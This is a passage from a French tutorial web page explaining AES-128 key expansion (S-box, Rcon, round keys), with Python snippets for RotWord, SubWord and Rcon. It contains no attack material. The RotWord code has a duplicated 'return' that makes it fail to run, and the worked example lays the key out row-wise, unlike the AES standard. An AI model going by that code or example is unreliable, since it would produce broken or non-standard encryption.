Pour faire simple il suffit de convertir son octet en hexadécimal, puis:</li>
<li>l&rsquo;octet à gauche représente la ligne</li>
<li>le deuxième, l&rsquo;octet à droite représentera la colonne<br>
On a donc par exemple:</li>
<li>0F &mdash;&mdash;&ndash;&gt;76</li>
<li>d5 &mdash;&mdash;&ndash;&gt; 03</li>
</ul>
<p>Cette opération rend le chiffrement non-linéaire.
Si on supprime cette opération ou qu’on l&rsquo;identité, notre chiffrement devient caduque et vulnérable.</p>
<h5 id="3-rcon">3. Rcon<a href="#3-rcon" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>Rcon (Round Constant) est  une transformation défini par \(Rcon(i) = [X^{i-1}, 0, 0, 0]\), avec \(i > 0\).
On a donc les valeurs suivantes pour \(1 \leq i \leq 10\) :<br>
\(X^0 = 1\)<br>
\(X^1 =1\times X^1 + 0\times 1 = 10_2 = 2\)<br>
\(X^2 = 1\times X^2 + 0\times X^1 + 0\times 1  = 100_2 = 4\)
&hellip;<br>
\(X^7 = 10000000_2 = 128\)<br>
\(X^8 = X^4 + X^3 + X + 1 = 11011_2 = 0x1b = 27\)  car on est dans \(GF(2^8)\)<br>
\(X^9 = X(X^8) = X(X^4 + X^3 + X + 1) = 1\times X^5 + 1\times X^4 + 0\times X^3 + 1\times X^2 + 1\times X + 0 \times 1 = 110110_2 = 0x36 = 54\)</p>
<h4 id="213-résumé">2.1.3 Résumé<a href="#213-r%c3%a9sum%c3%a9" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>Prenons un exemple pour mieux clarifier les choses.
Supposons que la clé est <code>00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F</code>. Ce sera notre premier <em>round_key</em>. Pour obtenir les round_key suivant :</p>
<ul>
<li>
<p>stocker la clé dans une matrice \(4 \times 4\)
</p>
$$ K_0 = \begin{bmatrix}
00&01&02&03 \\\\
04&05&06&07 \\\\
08&09&0A&0B \\\\
0C&0D&0E&0F \\\\
\end{bmatrix} $$
</li>
<li>
<p>On applique la rotation, la Sbox et Rcon sur la dernière colonne de \(K_0\)():<br>
</p>
$$\begin{bmatrix}
03 \\\\
07 \\\\
0B \\\\
0F \\\\
\end{bmatrix}
\underset{\Longrightarrow}{RotW}
\begin{bmatrix}
07 \\\\
0B \\\\
0F \\\\
03 \\\\
\end{bmatrix}
\underset{\Longrightarrow}{SubW}
\begin{bmatrix}
C5 \\\\
2B \\\\
76 \\\\
7B \\\\
\end{bmatrix}
\oplus
\begin{bmatrix}
Rcon(i=1) \\\\
00 \\\\
00 \\\\
00 \\\\
\end{bmatrix}
\Rightarrow
\begin{bmatrix}
C4 \\\\
2B \\\\
76 \\\\
7B \\\\
\end{bmatrix}= C
$$
</li>
<li>
<p>On applique ensuite le XOR successif sur les colonnes :</p>
</li>
</ul>
<p>\(C \oplus \text{colonne 0 de } K_0 = K'_0\)<br>
\(K'_0 \oplus \text{colonne 1 de } K_0 = K'_1\)<br>
\(K'_1 \oplus \text{colonne 2 de } K_0 = K'_2\)<br>
\(K'_2 \oplus \text{colonne 3 de } K_0 = K'_3\)<br>
Et comme ça on a notre premier <em>round_key</em> où les \(K'_i\) sont les colonnes de notre nouvelle clé puis on répète les mêmes opérations suur cett nouvelle clé pour obtenir le deuxième <em>round_key</em> et ainsi de suite.<br>
Si on effectue \(i\) tours de l’AES, on a à calculer \(i\) <em>round_key</em>, et  donc avoir \(i + 1\) clés.<br>
AES-128 à 10 tours \(\Longrightarrow\) \(11\) *round_keys *
L&rsquo;extension de la clé \(K_0\), est une fonction inversible. Chaque étape peut être inversée grâce aux XOR, à l’inverse de la Sbox et à Rcon qui donne toujours la même image en fonction du tour.<br>
Donc si l’on trouve \(K_i\), c&rsquo;est-à-dire on trouve une sous clé du \(i^{ème}\) tours et que l’on connaît la valeur de \(i\), alors  on peut remonter jusqu’à la clé \(K_0\).</p>
<h4 id="214-implémentation">2.1.4 Implémentation<a href="#214-impl%c3%a9mentation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>Voici une implémentation simple de chaque étape:
<a href="/crypto_aes/key_expansion.py">aes_key_expension.py</a>





<div class="tabs tabs-left">
  




<style>
  .tabs input#tab-0-0:checked ~ .tab-content-0-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-0" checked/>
<label for="tab-0-0" class="tab-label">RotWord</label>
<div class="tab-content tab-content-0-0">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rotword</span>(word<span style="color:#f92672">=</span>[]):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(word) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Wrong length: </span><span style="color:#e6db74">{</span>len(word)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">return</span> bytes(np<span style="color:#f92672">.</span>roll(list(word), <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>tolist())
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-0-1:checked ~ .tab-content-0-1 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-1" />
<label for="tab-0-1" class="tab-label">SubWord</label>
<div class="tab-content tab-content-0-1">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>S_BOX <span style="color:#f92672">=</span> [  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0xf2</span>, <span style="color:#ae81ff">0x6b</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0xc5</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0xd7</span>, <span style="color:#ae81ff">0xab</span>, <span style="color:#ae81ff">0x76</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xad</span>, <span style="color:#ae81ff">0xd4</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0xaf</span>, <span style="color:#ae81ff">0x9c</span>, <span style="color:#ae81ff">0xa4</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0xc0</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0xfd</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0xe5</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x15</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0x75</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0xa0</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x84</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0xb1</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0xcb</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xcf</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0xef</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0xfb</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0xf9</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x7f</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x9f</span>, <span style="color:#ae81ff">0xa8</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0xa3</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x8f</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x9d</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0xf5</span>, <span style="color:#ae81ff">0xbc</span>, <span style="color:#ae81ff">0xb6</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xf3</span>, <span style="color:#ae81ff">0xd2</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0xcd</span>, <span style="color:#ae81ff">0x0c</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0xa7</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x73</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0xdc</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0xde</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x0b</span>, <span style="color:#ae81ff">0xdb</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x06</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0xc2</span>, <span style="color:#ae81ff">0xd3</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x79</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0xe7</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x8d</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0xa9</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0xf4</span>, <span style="color:#ae81ff">0xea</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x7a</span>, <span style="color:#ae81ff">0xae</span>, <span style="color:#ae81ff">0x08</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0xb4</span>, <span style="color:#ae81ff">0xc6</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0xdd</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x1f</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0xbd</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x8a</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0xf6</span>, <span style="color:#ae81ff">0x0e</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x9e</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x9b</span>, <span style="color:#ae81ff">0x1e</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0xce</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0xdf</span>],  
</span></span><span style="display:flex;"><span>    [<span style="color:#ae81ff">0x8c</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0xe6</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0xb0</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0x16</span>],  
</span></span><span style="display:flex;"><span>]  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_sbox_map</span>():  
</span></span><span style="display:flex;"><span>    sbox_map <span style="color:#f92672">=</span> {}  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x100</span>):  
</span></span><span style="display:flex;"><span>        msb <span style="color:#f92672">=</span> i <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>  
</span></span><span style="display:flex;"><span>        lsb <span style="color:#f92672">=</span> i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x0f</span>  
</span></span><span style="display:flex;"><span>        sbox_map[i] <span style="color:#f92672">=</span> S_BOX[msb][lsb]  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sbox_map  
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">subword</span>(word<span style="color:#f92672">=</span>[], sbox_map<span style="color:#f92672">=</span>get_sbox_map()):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(word) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Wrong length: </span><span style="color:#e6db74">{</span>len(word)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> [sbox_map[i] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> word]
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-0-2:checked ~ .tab-content-0-2 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-2" />
<label for="tab-0-2" class="tab-label">Rcon</label>
<div class="tab-content tab-content-0-2">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># on utilisera directement un mapping comme Sbox</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rcon</span>(n<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> n <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Wrong n: </span><span style="color:#e6db74">{</span>n<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes([RCON_TABLE[n], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># D&#39;après le standard NIST le Rcon commence toujours par 1, mais dans certaines implémentations de AES, on trouve Rcon(0) = 0x8d (je ne sais toujours pas comment ça s&#39;obtient), ici je le mets mais faut savoir qu&#39;on l&#39;atteindra jamais car nos i commence à 1 donc voilà</span>
</span></span><span style="display:flex;"><span>RCON_TABLE <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x2F</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0xD4</span>, <span style="color:#ae81ff">0xB3</span>,<span style="color:#ae81ff">0x7D</span>,<span style="color:#ae81ff">0xFA</span>, <span style="color:#ae81ff">0xEF</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xBD</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x9F</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x4A</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x1D</span>, <span style="color:#ae81ff">0x3A</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xCB</span>, <span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x2F</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0xD4</span>, <span style="color:#ae81ff">0xB3</span>, <span style="color:#ae81ff">0x7D</span>, <span style="color:#ae81ff">0xFA</span>, <span style="color:#ae81ff">0xEF</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xBD</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x9F</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x4A</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x1D</span>, <span style="color:#ae81ff">0x3A</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xCB</span>, <span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x2F</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0xD4</span>, <span style="color:#ae81ff">0xB3</span>, <span style="color:#ae81ff">0x7D</span>, <span style="color:#ae81ff">0xFA</span>, <span style="color:#ae81ff">0xEF</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xBD</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x9F</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x4A</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x1D</span>, <span style="color:#ae81ff">0x3A</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xCB</span>, <span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x2F</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0xD4</span>, <span style="color:#ae81ff">0xB3</span>, <span style="color:#ae81ff">0x7D</span>, <span style="color:#ae81ff">0xFA</span>, <span style="color:#ae81ff">0xEF</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xBD</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x9F</span>, <span style="color:#ae81ff">0x25</span>, <span 